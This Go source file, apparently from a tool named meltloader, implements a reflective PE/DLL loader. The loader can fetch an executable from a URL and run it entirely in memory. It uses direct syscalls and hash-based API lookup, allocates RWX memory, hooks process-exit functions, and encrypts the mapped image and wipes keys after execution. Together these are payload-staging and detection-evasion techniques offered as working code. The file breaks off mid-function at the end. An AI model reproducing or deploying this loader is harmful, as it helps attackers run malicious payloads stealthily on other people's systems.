/*
package pe is responsible for performing reflective loading of PE/DLL files from various formats entirely in memory 
*/
package pe 

import (
    "bytes"
    api "github.com/carved4/go-wincall"
    sys "github.com/carved4/go-native-syscall"
    "github.com/Binject/debug/pe"
    "github.com/carved4/meltloader/pkg/net"
    "github.com/carved4/meltloader/pkg/enc"
    "encoding/binary"
    "fmt"
    "io/ioutil" 
    "unsafe"
    "strings"
    "strconv"
    "runtime"
    "runtime/debug"
    "sync"
)

type PEMapping struct {
    BaseAddress uintptr
    Size        uintptr
}

var (
    peRegistry = make(map[uintptr]*PEMapping)
    peRegistryMutex sync.RWMutex
)

// global exit guard hook representation
type exitHook struct {
    target    uintptr
    orig      [16]byte
    size      uintptr
    installed bool
}

// Observed behavior and rationale for exit guards
// - IAT-only redirection of ExitProcess/TerminateProcess is not sufficient for all payloads;
//   some resolve exits dynamically (GetProcAddress) or call CRT helpers (exit/_exit/_cexit).
// - A previous attempt to also hook ntdll-level routines such as RtlExitUserProcess (and
//   RaiseFailFastException) caused an access violation at process shutdown, as the Go runtime
//   and OS rely on these for clean finalization.
// - The solution that proved stable across tests: hook only user-mode/CRT exits (kernel32/
//   kernelbase ExitProcess/TerminateProcess and MSVC/UCRT exit variants) and leave ntdll
//   alone. This blocks payload-triggered process termination while allowing the host to exit
//   normally via RtlExitUserProcess -> NtTerminateProcess when our loader is done.
// - If a payload explicitly calls ntdll termination APIs, we can add an opt-in guard later,
//   but reflective payloads typically rely on user-mode exits through the runtime/CRT.
//
// installGlobalExitGuards redirects process-exit style APIs to ExitThread via a small x64 stub.
// It returns the allocated stub and the installed hooks to restore later.
func installGlobalExitGuards() (stub uintptr, hooks []exitHook, err error) {
    // Resolve ExitThread address via hash lookup as requested
    k32 := api.LoadLibraryW("kernel32.dll")
    if k32 == 0 {
        return 0, nil, fmt.Errorf("LoadLibraryW(kernel32) failed")
    }
    exitThread := api.GetFunctionAddress(k32, api.GetHash("ExitThread"))
    if exitThread == 0 {
        return 0, nil, fmt.Errorf("GetFunctionAddress(ExitThread) failed")
    }

    // Build a tiny stub: sub rsp,0x28; xor rcx,rcx; mov rax, ExitThread; call rax; add rsp,0x28; ret
    stubCode := []byte{
        0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
        0x48, 0x31, 0xC9, // xor rcx, rcx
        0x48, 0xB8, // mov rax, imm64
    }
    // append imm64 ExitThread
    buf := make([]byte, 8)
    binary.LittleEndian.PutUint64(buf, uint64(exitThread))
    stubCode = append(stubCode, buf...)
    stubCode = append(stubCode,
        0xFF, 0xD0, // call rax
        0x48, 0x83, 0xC4, 0x28, // add rsp,0x28
        0xC3, // ret (should not return)
    )

    // Allocate RWX memory for stub
    s, aerr := api.Call("kernel32.dll", "VirtualAlloc", 0, uintptr(len(stubCode)), uintptr(0x3000), uintptr(0x40))
    if aerr != nil || s == 0 {
        return 0, nil, fmt.Errorf("VirtualAlloc stub failed: %v", aerr)
    }
    stub = s
    // Copy code
    dst := (*[^uint32(0)]byte)(unsafe.Pointer(stub))[:len(stubCode):len(stubCode)]
    copy(dst, stubCode)

    // helper to lookup and hook a target if present
    addHook := func(mod string, name string) {
        if mod == "" || name == "" {
            return
        }
        h := api.LoadLibraryW(mod)
        if h == 0 {
            return
        }
        addr := api.GetFunctionAddress(h, api.GetHash(name))
        if addr == 0 {
            return
        }
        // write absolute jmp: mov rax, imm64; jmp rax
        var hk exitHook
        hk.target = addr
        hk.size = 12
        // Save original bytes
        for i := uintptr(0); i < hk.size; i++ {
            hk.orig[i] = *(*byte)(unsafe.Pointer(addr + i))
        }
        // Make writable
        var oldProt uint32
        api.Call("kernel32.dll", "VirtualProtect", addr, uintptr(hk.size), uintptr(0x40), uintptr(unsafe.Pointer(&oldProt)))
        // Build detour
        det := []byte{0x48, 0xB8}
        binary.LittleEndian.PutUint64(buf, uint64(stub))
        det = append(det, buf...)
        det = append(det, 0xFF, 0xE0) // jmp rax
        for i := uintptr(0); i < hk.size; i++ {
            *(*byte)(unsafe.Pointer(addr + i)) = det[i]
        }
        // Restore prot and flush icache
        api.Call("kernel32.dll", "VirtualProtect", addr, uintptr(hk.size), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
        proc, _ := api.Call("kernel32.dll", "GetCurrentProcess")
        api.Call("kernel32.dll", "FlushInstructionCache", proc, addr, uintptr(hk.size))
        hk.installed = true
        hooks = append(hooks, hk)
    }

    // Kernel32/KernelBase (user-mode exits)
    addHook("kernel32.dll", "ExitProcess")
    addHook("kernel32.dll", "TerminateProcess")
    addHook("kernelbase.dll", "ExitProcess")
    addHook("kernelbase.dll", "TerminateProcess")
    // Do not hook NTDLL termination paths to allow clean process shutdown
    // CRT variants
    addHook("msvcrt.dll", "exit")
    addHook("msvcrt.dll", "_exit")
    addHook("msvcrt.dll", "_cexit")
    addHook("ucrtbase.dll", "exit")
    addHook("ucrtbase.dll", "_exit")
    addHook("ucrtbase.dll", "_cexit")
    addHook("vcruntime140.dll", "_cexit")
    addHook("vcruntime140_1.dll", "_cexit")

    return stub, hooks, nil
}

func uninstallGlobalExitGuards(stub uintptr, hooks []exitHook) {
    // Restore all hooks
    for _, hk := range hooks {
        if !hk.installed || hk.target == 0 || hk.size == 0 {
            continue
        }
        var oldProt uint32
        api.Call("kernel32.dll", "VirtualProtect", hk.target, uintptr(hk.size), uintptr(0x40), uintptr(unsafe.Pointer(&oldProt)))
        for i := uintptr(0); i < hk.size; i++ {
            *(*byte)(unsafe.Pointer(hk.target + i)) = hk.orig[i]
        }
        api.Call("kernel32.dll", "VirtualProtect", hk.target, uintptr(hk.size), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
        proc, _ := api.Call("kernel32.dll", "GetCurrentProcess")
        api.Call("kernel32.dll", "FlushInstructionCache", proc, hk.target, uintptr(hk.size))
    }
    if stub != 0 {
        api.Call("kernel32.dll", "VirtualFree", stub, 0, uintptr(0x8000))
    }
}

func createPEMapping(baseAddress uintptr, size uintptr) *PEMapping {
	mapping := &PEMapping{
		BaseAddress: baseAddress,
		Size:        size,
	}
	
	peRegistryMutex.Lock()
	peRegistry[baseAddress] = mapping
	peRegistryMutex.Unlock()
	
	return mapping
}

func unregisterPE(baseAddress uintptr) {
	peRegistryMutex.Lock()
	delete(peRegistry, baseAddress)
	peRegistryMutex.Unlock()
}

//go:nosplit
//go:noinline
func GetPEB() uintptr

func cstringAt(addr uintptr) string {
	var b []byte
	for {
		c := *(*byte)(unsafe.Pointer(addr))
		if c == 0 {
			break
		}
		b = append(b, c)
		addr++
	}
	return string(b)
}

func isForwardedExport(moduleHandle unsafe.Pointer, procAddr uintptr) bool {
	dosHeader := (*IMAGE_DOS_HEADER)(moduleHandle)
	if dosHeader.E_magic != 0x5A4D {
		return false
	}

	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(dosHeader.E_lfanew)))
	if ntHeaders.Signature != 0x4550 {
		return false
	}

	exportDir := &ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
	if exportDir.VirtualAddress == 0 {
		return false
	}

	exportStart := uintptr(moduleHandle) + uintptr(exportDir.VirtualAddress)
	exportEnd := exportStart + uintptr(exportDir.Size)
	
	return procAddr >= exportStart && procAddr < exportEnd
}

func resolveForwardedExport(forwarderString string) (uintptr, error) {
	parts := strings.Split(forwarderString, ".")
	if len(parts) != 2 {
		return 0, fmt.Errorf("[ERROR] invalid forwarder string format: %s", forwarderString)
	}

	targetDLL := parts[0]
	targetFunction := parts[1]

	if !strings.HasSuffix(strings.ToLower(targetDLL), ".dll") {
		targetDLL += ".dll"
	}
	dllHandle := api.LoadLibraryW(targetDLL)

	var funcAddr uintptr
	var err error
	if strings.HasPrefix(targetFunction, "#") {
		ordinalStr := targetFunction[1:]
		ordinal, err := strconv.Atoi(ordinalStr)
		if err != nil {
			return 0, fmt.Errorf("[ERROR] invalid ordinal in forwarder: %s", targetFunction)
		}
		funcAddr, err = api.Call("kernel32.dll", "GetProcAddress", dllHandle, uintptr(ordinal))
		if err != nil {
			return 0, fmt.Errorf("[ERROR] failed to get ordinal %d from %s: %v", ordinal, targetDLL, err)
		}
	} else {
		funcNameBytes := append([]byte(targetFunction), 0)
		funcAddr, err = api.Call("kernel32.dll", "GetProcAddress", dllHandle, uintptr(unsafe.Pointer(&funcNameBytes[0])))
		if err != nil {
			return 0, fmt.Errorf("[ERROR] failed to get function %s from %s: %v", targetFunction, targetDLL, err)
		}
	}

	return funcAddr, nil
}

func checkForwardedExportByName(moduleHandle unsafe.Pointer, functionName string) (uintptr, bool) {
	dosHeader := (*IMAGE_DOS_HEADER)(moduleHandle)
	if dosHeader.E_magic != 0x5A4D {
		return 0, false
	}
	
	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(dosHeader.E_lfanew)))
	if ntHeaders.Signature != 0x4550 {
		return 0, false
	}

	exportDir := &ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
	if exportDir.VirtualAddress == 0 {
		return 0, false
	}

	exportTable := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(exportDir.VirtualAddress)))
	
	nameArray := (*[^uint32(0)]uint32)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(exportTable.AddressOfNames)))
	ordinalArray := (*[^uint32(0)]uint16)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(exportTable.AddressOfNameOrdinals)))
	functionArray := (*[^uint32(0)]uint32)(unsafe.Pointer(uintptr(moduleHandle) + uintptr(exportTable.AddressOfFunctions)))

	for i := uint32(0); i < exportTable.NumberOfNames; i++ {
		nameRVA := nameArray[i]
		nameAddr := uintptr(moduleHandle) + uintptr(nameRVA)
		exportName := cstringAt(nameAddr)
		
		if exportName == functionName {
			ordinal := ordinalArray[i]
			funcRVA := functionArray[ordinal]
			funcAddr := uintptr(moduleHandle) + uintptr(funcRVA)
			
			exportStart := uintptr(moduleHandle) + uintptr(exportDir.VirtualAddress)
			exportEnd := exportStart + uintptr(exportDir.Size)
			
			if funcAddr >= exportStart && funcAddr < exportEnd {
				return funcAddr, true
			}
			
			return 0, false
		}
	}
	
	return 0, false
}

func LoadPEFromBytes(peBytes []byte) (*PEMapping, error) {
	if len(peBytes) == 0 {
		return nil, fmt.Errorf("[ERROR] empty PE bytes provided")
	}
	
	return peLoader(&peBytes)
}

func LoadPEFromURLThreadTimed(url string, timeoutSeconds int) (*PEMapping, error) {
	if url == "" {
		return nil, fmt.Errorf("[ERROR] empty URL provided")
	}
	buff, err := net.DownloadToMemory(url)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to download PE from URL: %v", err)
	}
	return LoadPEFromBytesWithThreadTimed(buff, timeoutSeconds)
}

func LoadPEFromFile(filePath string) (*PEMapping, error) {
	peBytes, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to read PE file: %v", err)
	}
	
	return LoadPEFromBytes(peBytes)
}

func LoadPEFromBytesWithThread(peBytes []byte) (*PEMapping, error) {
	if len(peBytes) == 0 {
		return nil, fmt.Errorf("[ERROR] empty PE bytes provided")
	}
	
	return peThreadLoader(&peBytes, 2) // Default 2 seconds
}

func LoadPEFromFileWithThread(filePath string) (*PEMapping, error) {
	peBytes, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to read PE file: %v", err)
	}
	
	return peThreadLoader(&peBytes, 2) // Default 2 seconds
}

func LoadPEFromBytesWithThreadTimed(peBytes []byte, timeoutSeconds int) (*PEMapping, error) {
	if len(peBytes) == 0 {
		return nil, fmt.Errorf("[ERROR] empty PE bytes provided")
	}
	
	return peThreadLoader(&peBytes, timeoutSeconds)
}


func LoadPEFromFileWithThreadTimed(filePath string, timeoutSeconds int) (*PEMapping, error) {
	peBytes, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to read PE file: %v", err)
	}
	
	fmt.Printf("[+] Loading %s with %d second timeout for user interaction\n", filePath, timeoutSeconds)
	return peThreadLoader(&peBytes, timeoutSeconds)
}

func fixImportAddressTable(baseAddress uintptr, peFile *pe.File) error {

	if peFile == nil {
		return fmt.Errorf("[ERROR] invalid PE file")
	}

	importDirs, _, _, err := peFile.ImportDirectoryTable()
	if err != nil {
		return fmt.Errorf("[ERROR] failed to get import directory table: %v", err)
	}

	if len(importDirs) == 0 {
		return nil
	}


	for _, importDir := range importDirs {
		dllName := importDir.DllName

		dllHandle := api.LoadLibraryW(dllName)


		firstThunk := baseAddress + uintptr(importDir.FirstThunk)
		originalThunk := baseAddress + uintptr(importDir.OriginalFirstThunk)
		if importDir.OriginalFirstThunk == 0 {
			originalThunk = firstThunk
		}

		funcCount := 0
		for {
			ftThunk := (*ImageThunkData64)(unsafe.Pointer(firstThunk))
			oftThunk := (*ImageThunkData64)(unsafe.Pointer(originalThunk))

			if ftThunk.AddressOfData == 0 {
				break
			}

			var funcNamePtr unsafe.Pointer
			var funcName string
			
			if IsMSBSet(oftThunk.AddressOfData) {
				funcNamePtr, funcName = ParseOrdinal(oftThunk.AddressOfData)
			} else {
				funcNamePtr, funcName = ParseFuncAddress(baseAddress, oftThunk.AddressOfData)
			}

			procAddr, err := api.Call("kernel32.dll", "GetProcAddress", dllHandle, uintptr(funcNamePtr))
			if err != nil {
				forwarderAddr, isForwarded := checkForwardedExportByName(unsafe.Pointer(dllHandle), funcName)
				if isForwarded {
					forwarderString := cstringAt(forwarderAddr)
					realProcAddr, err := resolveForwardedExport(forwarderString)
					if err != nil {
						return fmt.Errorf("[ERROR] failed to resolve forwarded export %s: %v", forwarderString, err)
					}
					procAddr = realProcAddr
				} else {
					return fmt.Errorf("[ERROR] failed to get proc address for %s function '%s': %v", dllName, funcName, err)
				}
			} else {
				if isForwardedExport(unsafe.Pointer(dllHandle), procAddr) {
					forwarderString := cstringAt(procAddr)
				
					realProcAddr, err := resolveForwardedExport(forwarderString)
					if err != nil {
						return fmt.Errorf("[ERROR] failed to resolve forwarded export %s: %v", forwarderString, err)
					}
					procAddr = realProcAddr
				}
			}

			ftThunk.AddressOfData = procAddr

			firstThunk += unsafe.Sizeof(ImageThunkData64{})
			originalThunk += unsafe.Sizeof(ImageThunkData64{})
			funcCount++
		}

	}
	return nil
}

func str1(a string) string {
	return a
}

func fixRelocTable(loadedAddr uintptr, perferableAddr uintptr, relocDir *IMAGE_DATA_DIRECTORY) error {
	
	if relocDir == nil {
		return fmt.Errorf("[ERROR] relocation directory is nil")
	}
	
	maxSizeOfDir := relocDir.Size
	relocBlocks := relocDir.VirtualAddress
	
	if maxSizeOfDir == 0 || relocBlocks == 0 {
		return fmt.Errorf("[ERROR] invalid relocation directory: size=%d, rva=0x%x", maxSizeOfDir, relocBlocks)
	}
	
	var relocBlockMetadata *IMAGE_BASE_RELOCATION
	relocBlockOffset := uintptr(0)
	processedBlocks := 0
	
	for ; relocBlockOffset < uintptr(maxSizeOfDir); relocBlockOffset += uintptr(relocBlockMetadata.SizeOfBlock) {
		relocBlockAddr := loadedAddr + uintptr(relocBlocks) + relocBlockOffset
		relocBlockMetadata = (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(relocBlockAddr))
		
		if relocBlockMetadata.VirtualAddress == 0 || relocBlockMetadata.SizeOfBlock == 0 {
			break
		}
		
		if relocBlockMetadata.SizeOfBlock < 8 {
			return fmt.Errorf("[ERROR] invalid relocation block size: %d (minimum is 8)", relocBlockMetadata.SizeOfBlock)
		}
		
		entriesNum := (uintptr(relocBlockMetadata.SizeOfBlock) - unsafe.Sizeof(IMAGE_BASE_RELOCATION{})) / unsafe.Sizeof(ImageReloc{})
		pageStart := relocBlockMetadata.VirtualAddress
		
		relocEntryCursor := (*ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocBlockMetadata)) + unsafe.Sizeof(IMAGE_BASE_RELOCATION{})))

		processedEntries := 0
		for i := 0; i < int(entriesNum); i++ {
			relocType := relocEntryCursor.GetType()
			if relocType == 0 {
				relocEntryCursor = (*ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocEntryCursor)) + unsafe.Sizeof(ImageReloc{})))
				continue
			}

			relocationAddr := uintptr(pageStart) + loadedAddr + uintptr(relocEntryCursor.GetOffset())
			
			if relocationAddr < loadedAddr || relocationAddr >= loadedAddr+uintptr(maxSizeOfDir) {
			}
			
			if relocType == 3 {
				originalValue := *(*uint32)(unsafe.Pointer(relocationAddr))
				newValue := uint32(uintptr(originalValue) + loadedAddr - perferableAddr)
				*(*uint32)(unsafe.Pointer(relocationAddr)) = newValue
				processedEntries++
			} else if relocType == 10 { // IMAGE_REL_BASED_DIR64 (64-bit)
				originalValue := *(*uint64)(unsafe.Pointer(relocationAddr))
				newValue := uint64(uintptr(originalValue) + loadedAddr - perferableAddr)
				*(*uint64)(unsafe.Pointer(relocationAddr)) = newValue
				processedEntries++
			}
			
			relocEntryCursor = (*ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocEntryCursor)) + unsafe.Sizeof(ImageReloc{})))
		}
		
		processedBlocks++
	}
	
	if processedBlocks == 0 {
		return fmt.Errorf("[ERROR] no relocation blocks processed")
	}
	
	return nil
}

func CopySections(pefile *pe.File, image *[]byte, loc uintptr) error {
	
	for _, section := range pefile.Sections {
		if section.Size == 0 {
			continue
		}
		d, err := section.Data()
		if err != nil {
			return fmt.Errorf("[ERROR] failed to read section %s: %v", section.Name, err)
		}
		dataLen := uint32(len(d))
		dst := uint64(loc) + uint64(section.VirtualAddress)
		buf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(dst)))
		for index := uint32(0); index < dataLen; index++ {
			buf[index] = d[index]
		}
	}

	bbuf := bytes.NewBuffer(nil)
	binary.Write(bbuf, binary.LittleEndian, pefile.COFFSymbols)
	binary.Write(bbuf, binary.LittleEndian, pefile.StringTable)
	b := bbuf.Bytes()
	blen := uint32(len(b))
	baseBuf := (*[^uint32(0)]byte)(unsafe.Pointer(uintptr(loc)))
	for index := uint32(0); index < blen; index++ {
		baseBuf[index+pefile.FileHeader.PointerToSymbolTable] = b[index]
	}

	return nil
}

func peLoader(bytes0 *[]byte) (*PEMapping, error) {
	
	if len(*bytes0) < 64 {
		return nil, fmt.Errorf("[ERROR] PE file too small (less than 64 bytes)")
	}
	
	defer runtime.UnlockOSThread()
	runtime.GC()
	runtime.GC()
	
	oldGCPercent := debug.SetGCPercent(-1)
	defer debug.SetGCPercent(oldGCPercent)
	
	// generate encryption key for the mapped PE
	encKey, err := enc.GenerateKey(32)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to generate encryption key: %v", err)
	}
	
	pinnedBytes := make([]byte, len(*bytes0))
	copy(pinnedBytes, *bytes0)
	
	defer func() {
		runtime.KeepAlive(pinnedBytes)
		runtime.KeepAlive(bytes0)
		runtime.KeepAlive(&pinnedBytes[0])
	}()
	
	baseAddr := uintptr(unsafe.Pointer(&pinnedBytes[0]))
	
	if baseAddr == 0 {
		return nil, fmt.Errorf("[ERROR] invalid base address")
	}
	
	tgtFile := NtH(baseAddr)
	if tgtFile == nil {
		return nil, fmt.Errorf("[ERROR] invalid PE file - cannot parse NT headers")
	}

	peF, err := pe.NewFile(bytes.NewReader(pinnedBytes))
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to parse PE file: %v", err)
	}
	
	relocTable := GetRelocTable(tgtFile)
	preferableAddress := tgtFile.OptionalHeader.ImageBase

	status, err := sys.NtUnmapViewOfSection(0xffffffffffffffff, uintptr(tgtFile.OptionalHeader.ImageBase))
	if err != nil {
		// continue anyway, lazy but it could be expected
	}

	var imageBaseForPE uintptr
	regionSize := uintptr(tgtFile.OptionalHeader.SizeOfImage)
	
	imageBaseForPE = uintptr(preferableAddress)
	status, err = sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)

	if status != 0 && relocTable == nil {
		return nil, fmt.Errorf("[ERROR] no relocation table and cannot load to preferred address (status: 0x%x)", status)
	}
	
	if status != 0 && relocTable != nil {
		imageBaseForPE = 0
		regionSize = uintptr(tgtFile.OptionalHeader.SizeOfImage)
		status, err = sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)

		if status != 0 {
			return nil, fmt.Errorf("[ERROR] cannot allocate memory for PE (status: 0x%x, err: %v)", status, err)
		}
	}

	// defer encryption of the mapped PE after execution
	defer func() {
		// create a byte slice that points to the mapped PE memory
		mappedPE := (*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:regionSize:regionSize]
		enc.EncryptBuffer(&mappedPE, encKey)
		enc.SecureWipeBuffer(&encKey) // wipe the encryption key from memory
	}()

	headersSize := tgtFile.OptionalHeader.SizeOfHeaders
	copy((*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:headersSize], pinnedBytes[:headersSize])
	
	mappedDosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(imageBaseForPE))
	mappedNtHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(imageBaseForPE + uintptr(mappedDosHeader.E_lfanew)))
	
	if mappedNtHeader.Signature != 0x4550 {
		return nil, fmt.Errorf("[ERROR] invalid NT Signature: 0x%x", mappedNtHeader.Signature)
	}
	
	tgtFile.OptionalHeader.ImageBase = uint64(imageBaseForPE)
	mappedNtHeader.OptionalHeader.ImageBase = uint64(imageBaseForPE)

	if err := CopySections(peF, &pinnedBytes, imageBaseForPE); err != nil {
		return nil, fmt.Errorf("[ERROR] failed to copy sections: %v", err)
	}

	if err := fixImportAddressTable(imageBaseForPE, peF); err != nil {
		return nil, fmt.Errorf("[ERROR] failed to fix import address table: %v", err)
	}

	if imageBaseForPE != uintptr(preferableAddress) {
		if relocTable != nil {
			if err := fixRelocTable(imageBaseForPE, uintptr(preferableAddress), (*IMAGE_DATA_DIRECTORY)(unsafe.Pointer(relocTable))); err != nil {
				return nil, fmt.Errorf("[ERROR] failed to fix relocation table: %v", err)
			}
		}
	}
	
	entryPointRVA := mappedNtHeader.OptionalHeader.AddressOfEntryPoint
	
    startAddress := imageBaseForPE + uintptr(entryPointRVA)

	Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
	
	runtime.KeepAlive(pinnedBytes)
	runtime.KeepAlive(bytes0)
	runtime.KeepAlive(&pinnedBytes[0])
	
    // Guard against process-exit calls globally (install then remove after thread end)
    stub, hooks, ierr := installGlobalExitGuards()
    if ierr != nil {
        // non-fatal, continue without global guards
    }
    defer func() { uninstallGlobalExitGuards(stub, hooks) }()
    var threadHandle uintptr
    status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
    if status != 0 {
        uninstallGlobalExitGuards(stub, hooks)
        return nil, fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
    }

	runtime.KeepAlive(pinnedBytes)
	runtime.KeepAlive(bytes0)
	runtime.KeepAlive(&pinnedBytes[0])

	status, err = sys.NtWaitForSingleObject(threadHandle, false, nil)
	if status == 0 {
	} else if status == 0x80000004 {
		status = 0
	} else if status == 0x00000102 {
		status = 0
	} else {
		return nil, fmt.Errorf("[ERROR] thread execution failed with status: 0x%x", status)
	}
	
	runtime.KeepAlive(pinnedBytes)
	runtime.KeepAlive(bytes0)
	runtime.KeepAlive(&pinnedBytes[0])
	
    sys.NtClose(threadHandle)
	
	mapping := createPEMapping(imageBaseForPE, regionSize)
	return mapping, nil	
}

func peThreadLoader(bytes0 *[]byte, timeoutSeconds int) (*PEMapping, error) {
	
	if len(*bytes0) < 64 {
		return nil, fmt.Errorf("[ERROR] PE file too small (less than 64 bytes)")
	}
	
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	runtime.GC()
	runtime.GC()
	
	oldGCPercent := debug.SetGCPercent(-1)
	defer debug.SetGCPercent(oldGCPercent)
	
	// generate encryption key for the mapped PE
	encKey, err := enc.GenerateKey(32)
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to generate encryption key: %v", err)
	}
	
	pinnedBytes := make([]byte, len(*bytes0))
	copy(pinnedBytes, *bytes0)
	
	defer func() {
		runtime.KeepAlive(pinnedBytes)
		runtime.KeepAlive(bytes0)
		runtime.KeepAlive(&pinnedBytes[0])
	}()
	
	baseAddr := uintptr(unsafe.Pointer(&pinnedBytes[0]))
	
	if baseAddr == 0 {
		return nil, fmt.Errorf("[ERROR] invalid base address")
	}
	
	tgtFile := NtH(baseAddr)
	if tgtFile == nil {
		return nil, fmt.Errorf("[ERROR] invalid PE file - cannot parse NT headers")
	}

	peF, err := pe.NewFile(bytes.NewReader(pinnedBytes))
	if err != nil {
		return nil, fmt.Errorf("[ERROR] failed to parse PE file: %v", err)
	}
	
	relocTable := GetRelocTable(tgtFile)
	preferableAddress := tgtFile.OptionalHeader.ImageBase

	sys.NtUnmapViewOfSection(0xffffffffffffffff, uintptr(tgtFile.OptionalHeader.ImageBase))

	var imageBaseForPE uintptr
	regionSize := uintptr(tgtFile.OptionalHeader.SizeOfImage)
	
	imageBaseForPE = uintptr(preferableAddress)
	status, err := sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)

	if status != 0 && relocTable == nil {
		return nil, fmt.Errorf("[ERROR] no relocation table and cannot load to preferred address (status: 0x%x)", status)
	}
	
	if status != 0 && relocTable != nil {
		imageBaseForPE = 0
		regionSize = uintptr(tgtFile.OptionalHeader.SizeOfImage)
		status, err = sys.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)

		if status != 0 {
			return nil, fmt.Errorf("[ERROR] cannot allocate memory for PE (status: 0x%x, err: %v)", status, err)
		}
	}

	// defer encryption of the mapped PE after execution
	defer func() {
		// create a byte slice that points to the mapped PE memory
		mappedPE := (*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:regionSize:regionSize]
		enc.EncryptBuffer(&mappedPE, encKey)
		enc.SecureWipeBuffer(&encKey) // wipe the encryption key from memory
	}()

	headersSize := tgtFile.OptionalHeader.SizeOfHeaders
	copy((*[1 << 30]byte)(unsafe.Pointer(imageBaseForPE))[:headersSize], pinnedBytes[:headersSize])
	
	mappedDosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(imageBaseForPE))
	mappedNtHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(imageBaseForPE + uintptr(mappedDosHeader.E_lfanew)))
	
	if mappedNtHeader.Signature != 0x4550 {
		return nil, fmt.Errorf("[ERROR] invalid NT Signature: 0x%x", mappedNtHeader.Signature)
	}
	
	tgtFile.OptionalHeader.ImageBase = uint64(imageBaseForPE)
	mappedNtHeader.OptionalHeader.ImageBase = uint64(imageBaseForPE)

	if err := CopySections(peF, &pinnedBytes, imageBaseForPE); err != nil {
		return nil, fmt.Errorf("[ERROR] failed to copy sections: %v", err)
	}

	if err := fixImportAddressTable(imageBaseForPE, peF); err != nil {
		return nil, fmt.Errorf("[ERROR] failed to fix import address table: %v", err)
	}

	if imageBaseForPE != uintptr(preferableAddress) {
		if relocTable != nil {
			if err := fixRelocTable(imageBaseForPE, uintptr(preferableAddress), (*IMAGE_DATA_DIRECTORY)(unsafe.Pointer(relocTable))); err != nil {
				return nil, fmt.Errorf("[ERROR] failed to fix relocation table: %v", err)
			}
		}
	}
	
	entryPointRVA := mappedNtHeader.OptionalHeader.AddressOfEntryPoint
    startAddress := imageBaseForPE + uintptr(entryPointRVA)
    Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
	
	runtime.KeepAlive(pinnedBytes)
	runtime.KeepAlive(bytes0)
	runtime.KeepAlive(&pinnedBytes[0])
	
    // Install global exit guards
    stub, hooks, _ := installGlobalExitGuards()
    defer func() { uninstallGlobalExitGuards(stub, hooks) }()

    var threadHandle uintptr
    status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
    if status != 0 {
        uninstallGlobalExitGuards(stub, hooks)
        return nil, fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
    }

    // Wait up to timeout, terminate if needed
    waitRes, _ := api.Call("kernel32.dll", "WaitForSingleObject", threadHandle, uintptr(uint32(timeoutSeconds*1000)))
    if waitRes == 0x00000102 { // WAIT_TIMEOUT
        sys.NtTerminateThread(threadHandle, 0)
    }

    sys.NtClose(threadHandle)

	runtime.KeepAlive(pinnedBytes)
	runtime.KeepAlive(bytes0)
	runtime.KeepAlive(&pinnedBytes[0])
	
	mapping := createPEMapping(imageBaseForPE, regionSize)
	return mapping, nil	
}

// Melt function for PE mappings - similar to DLL Melt
func MeltPE(mapping *PEMapping) error {
	if mapping == nil {
		return fmt.Errorf("[ERROR] Invalid PE mapping provided")
	}
	
	result, err := api.Call("kernel32.dll", "VirtualFree", mapping.BaseAddress, uintptr(0), uintptr(0x8000))
	if err != nil {
		return fmt.Errorf("[ERROR] VirtualFree failed: %v", err)
	}
	
	if result == 0 {
		return fmt.Errorf("[ERROR] VirtualFree returned 0 (failure)")
	}
	unregisterPE(mapping.BaseAddress)
	
	return nil
}

// GetPEMap returns: slice of base addresses, slice of sizes, and total count of mapped PEs
func GetPEMap() ([]uintptr, []uintptr, int) {
	peRegistryMutex.RLock()
	defer peRegistryMutex.RUnlock()
	
	count := len(peRegistry)
	baseAddresses := make([]uintptr, 0, count)
